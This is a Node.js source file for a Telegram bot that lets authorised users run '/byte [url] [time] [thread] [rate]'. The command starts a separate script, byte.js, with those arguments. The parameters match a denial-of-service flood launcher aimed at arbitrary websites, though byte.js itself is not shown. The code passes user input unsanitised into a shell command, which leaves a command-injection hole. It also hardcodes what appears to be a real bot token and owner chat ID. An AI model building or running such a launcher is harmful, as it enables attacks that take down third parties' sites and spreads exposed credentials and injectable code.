const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Replace with your Telegram bot token
const token = '6933062429:AAHtAJX1VA4XCSguKuergi3BNNBLhzuCgn4';

// Initialize bot with the token
const bot = new TelegramBot(token, { polling: true });

// The chat ID of the bot owner (your chat ID)
const ownerChatId = 1201917438;

// List of authorized users
let authorizedUsers = [ownerChatId];

// Function to log bot usage activity to the console
function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text.toLowerCase();

  console.log(`Telegram Bot Usage Activity`);
  console.log(`• User ID: ${user.id}`);
  console.log(`• Username: ${user.username || 'Not available'}`);
  console.log(`• Chat ID: ${chat.id}`);
  console.log(`• Command: ${command}`);
}

// Function to check if a user is authorized
function isUserAuthorized(chatId) {
  return authorizedUsers.includes(chatId);
}

// Event listener for messages from users
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const command = msg.text.toLowerCase();

  // Log bot usage activity to the console
  logActivity(msg);

  // Respond to /admin command to add an authorized user
  if (command.startsWith('/admin')) {
    if (chatId === ownerChatId) {
      const args = command.split(' ');
      const newAdminId = parseInt(args[1]);

      if (!isNaN(newAdminId)) {
        authorizedUsers.push(newAdminId);
        bot.sendMessage(chatId, `User with chat ID ${newAdminId} has been authorized.`);
      } else {
        bot.sendMessage(chatId, 'Please provide a valid chat ID.');
      }
    } else {
      bot.sendMessage(chatId, 'You are not authorized to add new admins.');
    }
    return;
  }

  // Check if the user is authorized to use other commands
  if (!isUserAuthorized(chatId)) {
    bot.sendMessage(chatId, 'You are not authorized to use this bot.');
    return;
  }

  // Respond to /byte command
  if (command.startsWith('/byte')) {
    // Extract arguments from the message
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const thread = args[3];
    const rate = args[4];

    // Check if the message format is correct
    if (args.length === 5 && url && time && thread && rate) {
      // Run the byte.js file with the given arguments
      exec(`node byte.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Failed');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Failed');
          return;
        }
        // Display stdout output if successful
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Process has started.');
      });
    } else {
      // Inform the user that the message format is incorrect
      bot.sendMessage(chatId, 'Incorrect message format. Use the format: /byte [url] [time] [thread] [rate]');
    }
  }
});

// Function to send a message to a specific chat ID (your chat ID)
function sendMessageToChat(message) {
  const chatId = ownerChatId; // Your chat ID
  bot.sendMessage(chatId, message);
}

// Example of sending a message to the chat ID
sendMessageToChat('Bot is now active.');
